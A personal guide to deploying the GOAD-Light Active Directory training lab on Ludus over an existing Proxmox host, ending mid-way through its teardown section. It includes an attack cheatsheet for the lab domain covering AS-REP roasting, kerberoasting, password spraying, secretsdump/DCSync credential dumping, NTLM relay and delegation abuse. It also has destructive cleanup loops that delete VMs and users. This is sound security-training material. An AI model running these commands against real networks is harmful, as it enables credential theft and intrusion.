# GOAD on Ludus on Existing Proxmox — Complete Guide

Personal reference for deploying **Game Of Active Directory (GOAD-Light)** on top of **Ludus**, installed on an *existing* Proxmox host (not bare-metal Debian), with WireGuard access from a macOS client on the same LAN.

> Most online guides install Ludus on bare-metal Debian (Ludus then turns the box into Proxmox). This guide is for users who already have Proxmox running.

---

## Table of Contents

1. [Reference Scenario](#1-reference-scenario)
2. [Hardware Sizing](#2-hardware-sizing)
3. [Pre-flight Checks](#3-pre-flight-checks)
4. [Install Ludus](#4-install-ludus)
5. [Create Admin User](#5-create-admin-user)
6. [Build Windows Templates](#6-build-windows-templates)
7. [Install GOAD-Light](#7-install-goad-light)
8. [Add Kali Attacker](#8-add-kali-attacker)
9. [WireGuard from macOS](#9-wireguard-from-macos)
10. [SSH into Kali & First Recon](#10-ssh-into-kali--first-recon)
11. [Daily Operations](#11-daily-operations)
12. [Helper Scripts](#12-helper-scripts)
13. [Attack Cheatsheet](#13-attack-cheatsheet)
14. [Troubleshooting](#14-troubleshooting)
15. [Complete Teardown & Reclaim Space](#15-complete-teardown--reclaim-space)

---

## 1. Reference Scenario

| Component | Detail |
|---|---|
| Hardware | i9-13th gen, 32 GB RAM, 2 TB NVMe SSD |
| Hypervisor | Proxmox VE 9 (pre-existing install) |
| Proxmox IP | `192.168.1.149/24` on `vmbr0` |
| Gateway | `192.168.1.254` |
| Client | macOS on `192.168.1.0/24` |
| Lab type | GOAD-Light |
| Lab subnet | `10.3.0.0/16` (Ludus auto-assigned) |
| Range owner | `GOADLightbbe829` (auto-created Ludus user) |
| Kali attacker | `10.3.10.99` |

---

## 2. Hardware Sizing

| Lab | RAM (VMs) | Disk | Min Host RAM |
|---|---|---|---|
| GOAD-Light | ~25 GB | ~80 GB | 32 GB |
| GOAD-Full | ~50 GB | ~160 GB | 64 GB |
| Templates (one-time build) | — | ~80 GB extra | — |

With 32 GB RAM, **install GOAD-Light**. Trying to fit GOAD-Full on 32 GB leads to OOM and swapping.

---

## 3. Pre-flight Checks

Run as root on the Proxmox shell.

```bash
# CPU virt extensions (must return >0)
grep -cE 'vmx|svm' /proc/cpuinfo

# Proxmox version (must be 8 or 9)
pveversion

# Internet route uses wired bridge, not WiFi
ip route get 1.1.1.1
```

### Fix APT keyring conflicts (common on Proxmox 9)

Proxmox 9 ships a deb822 source file (`proxmox.sources`) using a modern keyring. If a duplicate `.list` or `.sources` file references the old keyring, APT errors out.

```bash
grep -rn "download.proxmox.com/debian/pve" /etc/apt/
```

You should see only ONE active source. If duplicates exist:

```bash
# Remove duplicate sources
rm -f /etc/apt/sources.list.d/pve-no-subscription.sources

# Remove legacy keyring
rm -f /etc/apt/trusted.gpg.d/proxmox-release-trixie.gpg

# Repoint proxmox.sources to modern keyring
sed -i 's|Signed-By:.*|Signed-By: /usr/share/keyrings/proxmox-archive-keyring.gpg|' \
  /etc/apt/sources.list.d/proxmox.sources

# Same for ceph if present
sed -i 's|Signed-By:.*|Signed-By: /usr/share/keyrings/proxmox-archive-keyring.gpg|' \
  /etc/apt/sources.list.d/ceph.sources 2>/dev/null

# Install keyring if missing
[ ! -f /usr/share/keyrings/proxmox-archive-keyring.gpg ] && \
  wget -O /usr/share/keyrings/proxmox-archive-keyring.gpg \
    https://enterprise.proxmox.com/debian/proxmox-release-trixie.gpg

apt update   # must succeed cleanly
```

### Storage layout check

```bash
df -h /
pvesm status
lvs
```

You want `local-lvm` (LVM-thin) with plenty of free space — that's where Ludus puts VMs. Default Proxmox install gives `local` ~96 GB and `local-lvm` the rest of the disk.

---

## 4. Install Ludus

```bash
curl -s https://ludus.cloud/install | bash
```

Verify auto-detected values when prompted:

| Field | Expected |
|---|---|
| `proxmox_node` | your hostname |
| `proxmox_interface` | `vmbr0` |
| `proxmox_local_ip` | `192.168.1.149` |
| `proxmox_gateway` | `192.168.1.254` |
| `proxmox_netmask` | `255.255.255.0` |

Watch progress in another shell:

```bash
ludus-install-status
```

When done, you'll see `Ludus install completed successfully` and a printed **Root API key**.

> **DO NOT re-run the installer if it fails partway.** Reruns create state inconsistencies between PocketBase, the key file, and the Proxmox token. If install fails, debug in place — see [Troubleshooting](#14-troubleshooting).

---

## 5. Create Admin User

The newer Ludus CLI requires `--email`:

```bash
export LUDUS_API_KEY=$(cat /opt/ludus/install/root-api-key)

ludus user add \
  --name "Admin" \
  --userid admin \
  --email admin@lab.local \
  --admin \
  --url https://127.0.0.1:8081
```

Set a password when prompted (≥8 chars). Save the printed admin API key:

```bash
export LUDUS_API_KEY='admin.XXXXXXXXXXXXXXXXXX'
echo "export LUDUS_API_KEY='admin.XXXXXXXXXXXXXXXXXX'" >> ~/.bashrc

# Get Proxmox web UI password for this admin user
ludus user creds get
```

---

## 6. Build Windows Templates

GOAD needs Win2016 and Win2019 templates (not shipped by default):

```bash
git clone https://gitlab.com/badsectorlabs/ludus /opt/ludus-src
cd /opt/ludus-src/templates

ludus templates add -d win2019-server-x64
ludus templates add -d win2016-server-x64

ludus templates build
ludus templates logs -f      # Ctrl+C just detaches; build keeps running
```

Takes 1–2 hours. When `ludus templates list` shows everything as `BUILT: TRUE`, move on.

---

## 7. Install GOAD-Light

```bash
# Required for GOAD's Python venv on Debian 13
apt install -y python3.13-venv python3-pip

cd /root
git clone https://github.com/Orange-Cyberdefense/GOAD.git
cd GOAD
./goad.sh -p ludus
```

Inside the GOAD shell:

```
GOAD/ludus/local > check
GOAD/ludus/local > set_lab GOAD-Light
GOAD/ludus/local > install
```

`check` validates the API key and templates. If it warns about disk space (it measures `/`, not `local-lvm`) but you have plenty in `local-lvm`, ignore — it's a `Log.warning`, not an error.

`install` will:
1. Create a new Ludus user (e.g. `GOADLightbbe829`)
2. Generate a range config
3. Deploy VMs from templates (~15–30 min)
4. Run Ansible to build the AD environment (~1.5–4 hours)

Monitor in another shell. First, find the GOAD user ID:

```bash
ludus users list all
```

Then watch its deploy:

```bash
export GOAD_USER='GOADLightbbe829'   # replace with yours
ludus --user $GOAD_USER range logs -f
```

### If install fails partway

Re-enter GOAD, resume from the existing instance:

```
./goad.sh -p ludus
GOAD/ludus/local > ls
GOAD/ludus/local > load <instance-id>
GOAD/ludus/local > install
```

Ansible roles are idempotent — pick up where they stopped.

---

## 8. Add Kali Attacker

GOAD doesn't include Kali by default. Add it to the GOAD user's range config:

```bash
export GOAD_USER='GOADLightbbe829'   # replace with yours

ludus --user $GOAD_USER range config get > /root/range-config.yml
cp /root/range-config.yml /root/range-config.yml.bak

cat >> /root/range-config.yml <<'EOF'
  - vm_name: "{{ range_id }}-kali"
    hostname: "{{ range_id }}-kali"
    template: kali-x64-desktop-template
    vlan: 10
    ip_last_octet: 99
    ram_gb: 4
    cpus: 4
    linux: true
    testing:
      snapshot: false
      block_internet: false
EOF

ludus --user $GOAD_USER range config set -f /root/range-config.yml

# Deploy WITHOUT --limit (chicken-and-egg with new VMs)
ludus --user $GOAD_USER range deploy
ludus --user $GOAD_USER range logs -f
```

When done, `ludus --user $GOAD_USER range status` shows 5 VMs with Kali at `10.3.10.99`.

---

## 9. WireGuard from macOS

### On Proxmox

```bash
ludus --user $GOAD_USER user wireguard > /root/ludus-mac.conf
cat /root/ludus-mac.conf
```

**CRITICAL**: Ludus's WireGuard server listens on **UDP/8080**, not 51820. The generated config sometimes lists the wrong port. Verify and fix:

```bash
ss -ulnp | grep wg            # confirms which port wg actually uses
sed -i 's|^Endpoint = .*|Endpoint = 192.168.1.149:8080|' /root/ludus-mac.conf
```

### On macOS

```bash
# In a Mac terminal
scp root@192.168.1.149:/root/ludus-mac.conf ~/Downloads/ludus.conf
```

If `scp` returns "No route to host" — see [Troubleshooting](#mac-scp-returns-no-route-to-host).

Install **WireGuard** from the Mac App Store, then:

1. Open WireGuard.app
2. `+` → **Import Tunnel(s) from File** → `~/Downloads/ludus.conf`
3. Toggle the tunnel **ON**

Verify:

```bash
ping -c 3 10.3.10.254    # router
ping -c 3 10.3.10.99     # kali
```

---

## 10. SSH into Kali & First Recon

```bash
ssh kali@10.3.10.99
# Password: kali
```

Add lab hosts to `/etc/hosts` for cleaner output:

```bash
sudo tee -a /etc/hosts <<'EOF'
10.3.10.10  dc01.sevenkingdoms.local sevenkingdoms.local
10.3.10.11  dc02.north.sevenkingdoms.local north.sevenkingdoms.local
10.3.10.22  srv02.sevenkingdoms.local
EOF
```

Quick reachability check:

```bash
ip a | grep inet
nmap -sn 10.3.10.0/24
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 10.3.10.10 10.3.10.11
```

---

## 11. Daily Operations

> Set `export GOAD_USER='GOADLightbbe829'` once per shell session, or persist it to `~/.bashrc`.

### Status checks

```bash
ludus users list all                                   # all users
ludus --user $GOAD_USER range list                     # range list
ludus --user $GOAD_USER range status                   # range with VMs and IPs
ludus templates list                                   # available templates
qm list                                                # all Proxmox VMs
pvesh get /pools/$GOAD_USER --output-format json | python3 -m json.tool
```

### Power management — entire range

```bash
ludus --user $GOAD_USER power on
ludus --user $GOAD_USER power off
```

### Power management — individual VMs

```bash
qm list                         # find VMID
qm start 110                    # power on
qm shutdown 110                 # graceful
qm stop 110                     # force
qm reboot 110                   # graceful reboot
qm status 110
qm config 110
```

### Console access

Browse to `https://192.168.1.149:8006`, log in as `root@pam` or `admin@pam` (password from `ludus user creds get`), click any VM → **Console**.

### Snapshots

GOAD's testing mode auto-snapshots all VMs:

```bash
ludus --user $GOAD_USER testing start    # take snapshots
ludus --user $GOAD_USER testing revert   # roll back
ludus --user $GOAD_USER testing stop     # delete snapshots
```

Manual Proxmox snapshots (more control):

```bash
# Snapshot all VMs in pool
for vmid in $(pvesh get /pools/$GOAD_USER --output-format json | \
  python3 -c "import sys,json; [print(m['vmid']) for m in json.load(sys.stdin)['members']]"); do
    qm snapshot $vmid clean-state --description "Pre-attack baseline"
done

# Restore
for vmid in $(pvesh get /pools/$GOAD_USER --output-format json | \
  python3 -c "import sys,json; [print(m['vmid']) for m in json.load(sys.stdin)['members']]"); do
    qm rollback $vmid clean-state
done
```

### Logs

```bash
ludus --user $GOAD_USER range logs -f                           # live deploy
ludus --user $GOAD_USER range logs | tail -200                  # recent
cat /opt/ludus/ranges/$GOAD_USER/ansible.log                    # ansible log
journalctl -u ludus -f                                          # ludus server
journalctl -u ludus-admin -f                                    # ludus admin
```

### RDP files for Windows VMs

```bash
ludus --user $GOAD_USER range rdp
# Downloads rdp.zip with .rdp files for each Windows host
```

### Quick health one-liner

```bash
echo "=== Services ===" && systemctl is-active ludus ludus-admin && \
echo "=== Range ===" && ludus --user $GOAD_USER range status && \
echo "=== Disk ===" && df -h / /var/lib/vz && \
echo "=== Memory ===" && free -h && \
echo "=== WireGuard ===" && wg show
```

---

## 12. Helper Scripts

Save these to `/root/scripts/` and `chmod +x` them. All take `GOAD_USER` from `$1` or env var.

### `start-goad.sh` — boot lab in correct order

```bash
#!/usr/bin/env bash
# Boots router → DCs → member servers → Kali in order with delays.
set -euo pipefail

GOAD_USER="${1:-${GOAD_USER:-}}"
[[ -z "$GOAD_USER" ]] && { echo "Usage: $0 <GOAD_USER_ID>"; exit 1; }

mapfile -t POOL_DATA < <(
    pvesh get /pools/"$GOAD_USER" --output-format json 2>/dev/null | \
    python3 -c "
import sys, json
for m in json.load(sys.stdin).get('members', []):
    print(f\"{m['vmid']} {m['name']}\")"
)

start_matching() {
    local pattern="$1" label="$2"
    for line in "${POOL_DATA[@]}"; do
        local vmid=$(echo "$line" | awk '{print $1}')
        local name=$(echo "$line" | awk '{print $2}')
        if [[ "$name" =~ $pattern ]]; then
            local status=$(qm status "$vmid" 2>/dev/null | awk '{print $2}')
            if [[ "$status" == "running" ]]; then
                echo "    [=] $name already running"
            else
                echo "    [+] Starting $label: $name"
                qm start "$vmid"
            fi
        fi
    done
}

echo "[*] Phase 1: Router"; start_matching 'router' 'router'; sleep 15
echo "[*] Phase 2: DCs"; start_matching '-DC[0-9]+' 'DC'; sleep 60
echo "[*] Phase 3: Members"; start_matching '-(SRV|SQL|WEB|APP|FS)[0-9]+' 'member'; sleep 20
echo "[*] Phase 4: Kali"; start_matching '-kali' 'Kali'
echo "[✓] Done. Toggle WireGuard ON, then: ssh kali@10.3.10.99"
```

### `stop-goad.sh` — graceful shutdown in reverse order

```bash
#!/usr/bin/env bash
set -euo pipefail

GOAD_USER="${1:-${GOAD_USER:-}}"
[[ -z "$GOAD_USER" ]] && { echo "Usage: $0 <GOAD_USER_ID>"; exit 1; }

mapfile -t POOL_DATA < <(
    pvesh get /pools/"$GOAD_USER" --output-format json 2>/dev/null | \
    python3 -c "
import sys, json
for m in json.load(sys.stdin).get('members', []):
    print(f\"{m['vmid']} {m['name']}\")"
)

shutdown_matching() {
    local pattern="$1" label="$2"
    local pids=()
    for line in "${POOL_DATA[@]}"; do
        local vmid=$(echo "$line" | awk '{print $1}')
        local name=$(echo "$line" | awk '{print $2}')
        if [[ "$name" =~ $pattern ]]; then
            local status=$(qm status "$vmid" 2>/dev/null | awk '{print $2}')
            [[ "$status" == "stopped" ]] && { echo "    [=] $name already stopped"; continue; }
            echo "    [-] Shutting $label: $name"
            qm shutdown "$vmid" --timeout 120 --forceStop 1 &
            pids+=($!)
        fi
    done
    for p in "${pids[@]}"; do wait "$p" 2>/dev/null || true; done
}

echo "[*] Phase 1: Kali"; shutdown_matching '-kali' 'Kali'
echo "[*] Phase 2: Members"; shutdown_matching '-(SRV|SQL|WEB|APP|FS)[0-9]+' 'member'
echo "[*] Phase 3: DCs"; shutdown_matching '-DC[0-9]+' 'DC'
echo "[*] Phase 4: Router"; shutdown_matching 'router' 'router'
echo "[✓] Shutdown complete"
```

### `status-goad.sh` — one-shot status snapshot

```bash
#!/usr/bin/env bash
GOAD_USER="${1:-${GOAD_USER:-}}"
[[ -z "$GOAD_USER" ]] && { echo "Usage: $0 <GOAD_USER_ID>"; exit 1; }

hr() { echo "----------------------------------------------------------------"; }

hr; echo "  Services"; hr
systemctl is-active ludus ludus-admin

hr; echo "  Range"; hr
ludus --user "$GOAD_USER" range status 2>/dev/null

hr; echo "  Disk"; hr
df -h / 2>/dev/null | head -2
pvesm status 2>/dev/null | grep -E '^(Name|local|local-lvm)'

hr; echo "  Memory"; hr
free -h | head -2

hr; echo "  WireGuard"; hr
wg show 2>/dev/null | grep -E '(interface|peer|latest|transfer)'

hr; echo "  Recent errors (10 mins)"; hr
journalctl -u ludus -u ludus-admin --since '10 minutes ago' 2>/dev/null | \
    grep -iE 'error|fatal|fail' | tail -5
```

### `snapshot-goad.sh` — bulk snapshot before destructive testing

```bash
#!/usr/bin/env bash
set -euo pipefail

GOAD_USER="${1:-${GOAD_USER:-}}"
SNAP_NAME="${2:-clean-baseline}"
[[ -z "$GOAD_USER" ]] && { echo "Usage: $0 <GOAD_USER_ID> [snapshot_name]"; exit 1; }

SNAP_NAME=$(echo "$SNAP_NAME" | tr -c 'A-Za-z0-9_-' '_')

mapfile -t VMIDS < <(
    pvesh get /pools/"$GOAD_USER" --output-format json 2>/dev/null | \
    python3 -c "import sys, json; [print(m['vmid']) for m in json.load(sys.stdin).get('members', [])]"
)

read -rp "Snapshot ${#VMIDS[@]} VMs as '$SNAP_NAME'? [y/N] " ans
[[ "$ans" =~ ^[Yy]$ ]] || exit 0

for vmid in "${VMIDS[@]}"; do
    echo "[+] Snapshotting VMID $vmid"
    qm listsnapshot "$vmid" 2>/dev/null | grep -qE "^\s*$SNAP_NAME\b" && \
        qm delsnapshot "$vmid" "$SNAP_NAME" --force 1
    qm snapshot "$vmid" "$SNAP_NAME" --description "snapshot-goad.sh $(date -Iseconds)"
done
echo "[✓] All snapshotted as '$SNAP_NAME'"
```

### `restore-goad.sh` — rollback all VMs to snapshot

```bash
#!/usr/bin/env bash
set -euo pipefail

GOAD_USER="${1:-${GOAD_USER:-}}"
SNAP_NAME="${2:-clean-baseline}"
[[ -z "$GOAD_USER" ]] && { echo "Usage: $0 <GOAD_USER_ID> [snapshot_name]"; exit 1; }

SNAP_NAME=$(echo "$SNAP_NAME" | tr -c 'A-Za-z0-9_-' '_')

mapfile -t VMIDS < <(
    pvesh get /pools/"$GOAD_USER" --output-format json 2>/dev/null | \
    python3 -c "import sys, json; [print(m['vmid']) for m in json.load(sys.stdin).get('members', [])]"
)

# Validate snapshot exists on every VM before any rollback
missing=()
for v in "${VMIDS[@]}"; do
    qm listsnapshot "$v" 2>/dev/null | grep -qE "^\s*$SNAP_NAME\b" || missing+=("$v")
done
[[ ${#missing[@]} -gt 0 ]] && { echo "Snapshot missing on: ${missing[*]}"; exit 1; }

read -rp "Roll back ${#VMIDS[@]} VMs to '$SNAP_NAME'? [y/N] " ans
[[ "$ans" =~ ^[Yy]$ ]] || exit 0

for v in "${VMIDS[@]}"; do qm stop "$v" 2>/dev/null || true; done
sleep 5
for v in "${VMIDS[@]}"; do
    echo "[<] Rolling back VMID $v"
    qm rollback "$v" "$SNAP_NAME"
done
echo "[✓] Rollback complete. Run start-goad.sh to power on."
```

---

## 13. Attack Cheatsheet

### Lab layout

| Host | IP | Role | Domain |
|---|---|---|---|
| router | 10.3.10.254 | Lab router | — |
| DC01 | 10.3.10.10 | Domain controller | `sevenkingdoms.local` |
| DC02 | 10.3.10.11 | Domain controller | `north.sevenkingdoms.local` |
| SRV02 | 10.3.10.22 | File / IIS / MSSQL | `sevenkingdoms.local` |
| Kali | 10.3.10.99 | Attacker | — |

### User enumeration (no creds needed)

```bash
# Build a candidate list (GoT-themed)
cat > /tmp/users.txt <<'EOF'
stannis.baratheon
robert.baratheon
jaime.lannister
tyrion.lannister
cersei.lannister
brandon.stark
robb.stark
arya.stark
sansa.stark
catelyn.stark
eddard.stark
jon.snow
samwell.tarly
hodor
khal.drogo
daenerys.targaryen
EOF

kerbrute userenum -d sevenkingdoms.local --dc 10.3.10.10 /tmp/users.txt
kerbrute userenum -d north.sevenkingdoms.local --dc 10.3.10.11 /tmp/users.txt
```

Or pull the actual user list from GOAD source on Proxmox:

```bash
ls /root/GOAD/ad/GOAD-Light/data/
cat /root/GOAD/ad/GOAD-Light/data/*.json
```

### AS-REP roasting

```bash
impacket-GetNPUsers -dc-ip 10.3.10.10 -no-pass \
  -usersfile /tmp/valid-users.txt \
  sevenkingdoms.local/

hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

### Kerberoasting (with creds)

```bash
impacket-GetUserSPNs -dc-ip 10.3.10.10 -request \
  sevenkingdoms.local/<user>:<password>

hashcat -m 13100 spn-hash.txt /usr/share/wordlists/rockyou.txt
```

### Password spraying

```bash
nxc smb 10.3.10.10 -u /tmp/valid-users.txt -p 'Password123!'
nxc smb 10.3.10.10 -u /tmp/valid-users.txt -p /tmp/passwords.txt --continue-on-success
```

### SMB enumeration

```bash
nxc smb 10.3.10.10 -u '' -p ''                      # null session
nxc smb 10.3.10.0/24 -u <user> -p <pass>
nxc smb 10.3.10.0/24 -u <user> -p <pass> --shares
nxc smb 10.3.10.10 -u <user> -p <pass> --rid-brute 5000
```

### LDAP enumeration

```bash
nxc ldap 10.3.10.10 -u <user> -p <pass> --groups
nxc ldap 10.3.10.10 -u <user> -p <pass> --users
nxc ldap 10.3.10.10 -u <user> -p <pass> --asreproast asrep.txt
nxc ldap 10.3.10.10 -u <user> -p <pass> --kerberoasting kerb.txt
nxc ldap 10.3.10.10 -u <user> -p <pass> --admin-count
```

### BloodHound

```bash
bloodhound-python -d sevenkingdoms.local \
  -u <user> -p <pass> \
  -ns 10.3.10.10 \
  -c All --zip

# Cross-domain trust
bloodhound-python -d north.sevenkingdoms.local \
  -u <user> -p <pass> \
  -ns 10.3.10.11 \
  -c All --zip

neo4j console &
bloodhound &
```

### Authenticated execution

```bash
evil-winrm -i 10.3.10.10 -u <user> -p <pass>
nxc winrm 10.3.10.10 -u <user> -p <pass> -x 'whoami /all'

impacket-psexec sevenkingdoms.local/<admin>:<pass>@10.3.10.10
impacket-wmiexec sevenkingdoms.local/<admin>:<pass>@10.3.10.10

xfreerdp /u:<user> /p:<pass> /d:sevenkingdoms.local /v:10.3.10.10 /dynamic-resolution
```

### Credential dumping

```bash
impacket-secretsdump sevenkingdoms.local/<admin>:<pass>@10.3.10.10
nxc smb 10.3.10.0/24 -u <admin> -p <pass> --sam --lsa

# DCSync (DA or replication rights required)
impacket-secretsdump sevenkingdoms.local/<admin>:<pass>@10.3.10.10 -just-dc-user krbtgt
nxc smb 10.3.10.10 -u <admin> -p <pass> --ntds
```

### NTLM relay

```bash
nxc smb 10.3.10.0/24 --gen-relay-list relay-targets.txt

# Terminal 1 — responder (use your wg interface name)
sudo responder -I tun0 -wF

# Terminal 2 — relay
sudo impacket-ntlmrelayx -tf relay-targets.txt -smb2support
```

### MSSQL (SRV02)

```bash
nxc mssql 10.3.10.22 -u <user> -p <pass> -q "SELECT @@version"
nxc mssql 10.3.10.22 -u <user> -p <pass> -x 'whoami'
nxc mssql 10.3.10.22 -u <user> -p <pass> -M mssql_priv
```

### Constrained delegation

```bash
impacket-findDelegation -dc-ip 10.3.10.10 sevenkingdoms.local/<user>:<pass>

impacket-getST -spn 'cifs/dc01.sevenkingdoms.local' \
  -impersonate Administrator \
  -dc-ip 10.3.10.10 \
  sevenkingdoms.local/<svc>:<pass>

export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass dc01.sevenkingdoms.local
```

### GOAD-Light intentional vulnerabilities

Configured by install scripts (`ls /root/GOAD/ad/GOAD-Light/scripts/` to see all):
- AS-REP roastable accounts (DontReqPreAuth)
- Kerberoastable service accounts
- Constrained / Resource-Based delegation
- NTLM relay (weakened SMB signing)
- GPO abuse (misconfigured GPO permissions)
- DCSync rights for non-DA accounts
- Responder-friendly broadcast

---

## 14. Troubleshooting

### Install: APT keyring conflict

**Error**: `Conflicting values set for option Signed-By regarding source http://download.proxmox.com/debian/pve/`

**Fix**: See [Pre-flight Checks](#3-pre-flight-checks). Remove duplicate `.sources` files and the legacy keyring, repoint to modern keyring, `apt update`, then resume installer.

---

### Install: "not authorized to access endpoint"

**Error**: `Failed to create initial admin user: creating default range: unable to create pool: not authorized to access endpoint`

**Cause**: Proxmox API token (`root@pam!ludus-token`) has stale secret.

**Fix**: Regenerate token:

```bash
pveum user token remove root@pam ludus-token
pveum user token add root@pam ludus-token --privsep 0 --comment "Ludus Token"
# Save the printed value
```

If patching PocketBase to match doesn't work (encryption issues), fully reinstall — see [Teardown](#15-complete-teardown--reclaim-space).

---

### Install: 401 Invalid API key (PocketBase ↔ key file mismatch)

**Symptom**: `ludus user add` returns 401 even though the file's key authenticates against PocketBase directly.

**Cause**: bcrypt hash in the `users` table doesn't match the cleartext key file.

**Fix**:

```bash
apt install -y python3-bcrypt
ROOT_KEY=$(cat /opt/ludus/install/root-api-key)

NEW_HASH=$(python3 -c "
import bcrypt
print(bcrypt.hashpw('$ROOT_KEY'.encode(), bcrypt.gensalt(rounds=4)).decode())
")

JWT=$(curl -sk -X POST https://127.0.0.1:8080/api/collections/_superusers/auth-with-password \
  -H "Content-Type: application/json" \
  -d "{\"identity\":\"root@ludus.internal\",\"password\":\"$ROOT_KEY\"}" \
  | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')

ROOT_ID=$(curl -sk "https://127.0.0.1:8080/api/collections/users/records?filter=userID='ROOT'" \
  -H "Authorization: Bearer $JWT" | sed -n 's/.*"id":"\([^"]*\)".*/\1/p' | head -1)

curl -sk -X PATCH "https://127.0.0.1:8080/api/collections/users/records/$ROOT_ID" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d "{\"hashedAPIKey\":\"$NEW_HASH\"}"
```

---

### Install: `--email` required

**Fix**:

```bash
ludus user add \
  --name "Admin" \
  --userid admin \
  --email admin@lab.local \
  --admin \
  --url https://127.0.0.1:8081
```

---

### Bash: `!ludus` mangling pasted commands

**Symptom**: Pasting `root@pam!ludus-token=...` produces garbled commands.

**Cause**: Bash history expansion treats `!ludus` as "rerun last command starting with ludus".

**Fix**:

```bash
set +H                              # this session
echo "set +H" >> ~/.bashrc          # persistent
```

---

### GOAD: `python3.13-venv` missing

**Fix**:

```bash
apt install -y python3.13-venv python3-pip
rm -rf /root/.goad/.venv
cd /root/GOAD && ./goad.sh -p ludus
```

---

### GOAD check: "not enough disk space" warning

**Cause**: GOAD checks `/`, not `local-lvm`. False alarm if templates are built and `local-lvm` has space.

**Fix**: Ignore the warning. Or grow `pve-root`:

```bash
vgs pve
lvextend -L +16G /dev/pve/root
resize2fs /dev/pve/root
```

---

### Add Kali: "Could not match supplied host pattern"

**Cause**: `--limit` filtered out a host that doesn't exist yet (chicken-and-egg).

**Fix**: Deploy without `--limit`. Idempotent on existing VMs:

```bash
ludus --user $GOAD_USER range deploy
```

---

### Mac: scp returns "No route to host"

Mac is on `192.168.1.x`, Proxmox is on `192.168.1.149`, but ping/scp fails.

**Cause options (check in order):**

1. **Local Network privacy permission** (most common): macOS blocks LAN access per-app. **System Settings → Privacy & Security → Local Network → enable for iTerm/Terminal/Warp**, then quit and reopen the terminal app.

   Diagnostic:
   ```bash
   sudo log show --last 2m --predicate 'subsystem == "com.apple.networkextension"' --info | grep -i denied
   # Look for "Local network denied by preference for iTerm"
   ```

2. **mitmproxy network extension** loaded but mitmproxy daemon not running: drops packets. **System Settings → General → Login Items & Extensions → Network Extensions → disable mitmproxy**.

3. **Other VPN clients** (Tailscale, NordVPN, Cisco AnyConnect, GlobalProtect): even when "disconnected", their network extensions may filter packets.

   ```bash
   systemextensionsctl list
   ifconfig | grep '^utun'
   ```

   Quit all VPN apps, disable extensions, retest.

4. **Stale ARP**:
   ```bash
   sudo arp -da
   sudo dscacheutil -flushcache
   sudo killall -HUP mDNSResponder
   ```

---

### WireGuard: tunnel active but no traffic to lab

**Symptom**: WireGuard.app shows "Active" with `Data sent`, but ping to `10.3.10.x` times out.

**Cause**: Ludus runs WireGuard on **UDP/8080**, not 51820. Generated config sometimes lists wrong port.

**Diagnostic on Proxmox**:
```bash
ss -ulnp | grep -E ':8080|:51820'
wg show     # check 'latest handshake' — empty means handshake never happened
```

**Fix on Mac**: WireGuard.app → tunnel → Edit → change `Endpoint` to `192.168.1.149:8080` → Save → reactivate.

**Fix on Proxmox before generating future configs**:
```bash
sed -i 's|^Endpoint = .*|Endpoint = 192.168.1.149:8080|' /root/ludus-mac.conf
```

---

### Lab: deployment status shows ERROR

```bash
ludus --user $GOAD_USER range status
# DEPLOYMENT STATUS: ERROR
```

**Diagnostic**:
```bash
cat /opt/ludus/ranges/$GOAD_USER/ansible.log
ludus --user $GOAD_USER range logs | tail -200
```

**Common fixes**: re-run `range deploy` (idempotent); start a stopped VM with `qm start`; build a missing template with `ludus templates build`.

---

### Storage: "out of space" during deploy

**Diagnostic**:
```bash
pvesm status
df -h /var/lib/vz
lvs
```

**Fix**: Edit `/opt/ludus/config.yml`:

```yaml
proxmox_vm_storage_pool: local-lvm    # not 'local'
proxmox_vm_storage_format: raw         # required for LVM-thin
proxmox_iso_storage_pool: local        # ISOs need filesystem-backed pool
```

After editing:
```bash
systemctl restart ludus ludus-admin
pveum acl modify /storage/local-lvm -group ludus_admins -roles PVEDatastoreAdmin
pveum acl modify /storage/local-lvm -group ludus_users -roles DatastoreUser
```

---

## 15. Complete Teardown & Reclaim Space

> **⚠ DESTRUCTIVE.** Wipes all lab VMs, templates, range data, snapshots, and Ludus database. Existing non-Ludus VMs are preserved.

### Pre-flight inventory

```bash
qm list                                # which VMs exist
pveum group list                       # ludus_admins / ludus_users present
pveum user token list root@pam         # ludus-token present
pvesh get /pools                       # ADMIN, SHARED, GOAD<...> pools
ip link show | grep -E 'vmbr|tap|tun'
ls -la /opt/ludus/ 2>/dev/null
df -h /
pvesm status
```

Note which VMs are Ludus-managed vs your own — Ludus VMs are templates Ludus built (typical VMIDs 102–108) plus rangeID-prefixed VMs (e.g. `GOADLightbbe829-*`, VMIDs 109+).

### Step 1 — Stop Ludus services

```bash
systemctl stop ludus ludus-admin
systemctl disable ludus ludus-admin
```

### Step 2 — Destroy Ludus VMs

```bash
# Edit this list to be ONLY VMs you want destroyed
LUDUS_VMIDS="102 103 104 105 106 107 108 109 110 111 112 113"

for v in $LUDUS_VMIDS; do
  echo "Stopping $v"
  qm stop $v 2>/dev/null
done
sleep 5

for v in $LUDUS_VMIDS; do
  echo "Destroying $v"
  qm destroy $v --purge --skiplock 2>/dev/null
done

qm list   # verify
```

> If destroy fails due to a lock: `qm unlock $v && qm destroy $v --purge --skiplock`

### Step 3 — Remove pools

```bash
for pool in ADMIN SHARED GOADLightbbe829 admin venom; do
  pvesh delete /pools/$pool 2>/dev/null && echo "Deleted /pools/$pool"
done
```

### Step 4 — Remove Proxmox token, users, groups, ACLs

```bash
pveum user token remove root@pam ludus-token 2>/dev/null

# Remove Proxmox PAM users created by Ludus (be careful — keep your own)
for u in $(pveum user list --output-format json 2>/dev/null | \
  python3 -c "
import sys, json
for u in json.load(sys.stdin):
    uid = u.get('userid', '')
    if uid.endswith('@pam') and uid != 'root@pam':
        print(uid)"); do
  echo "Removing Proxmox user: $u"
  pveum user delete "$u" 2>/dev/null
done

pveum group delete ludus_admins 2>/dev/null
pveum group delete ludus_users 2>/dev/null

# Verify no leftover ACLs
pveum acl list | grep -iE 'ludus|/pool/(ADMIN|SHARED)'
```

### Step 5 — Remove host PAM users

```bash
for u in ludus admin venom GOADLightbbe829; do
  if id "$u" &>/dev/null; then
    pkill -u "$u" 2>/dev/null
    sleep 1
    userdel -r "$u" 2>/dev/null && echo "Removed PAM user $u"
  fi
done
```

### Step 6 — Remove Ludus bridges

```bash
ip link show | grep -E '^[0-9]+: vmbr10'

for br in $(ip -o link show | awk -F': ' '/vmbr10/ {print $2}'); do
  ifdown $br 2>/dev/null
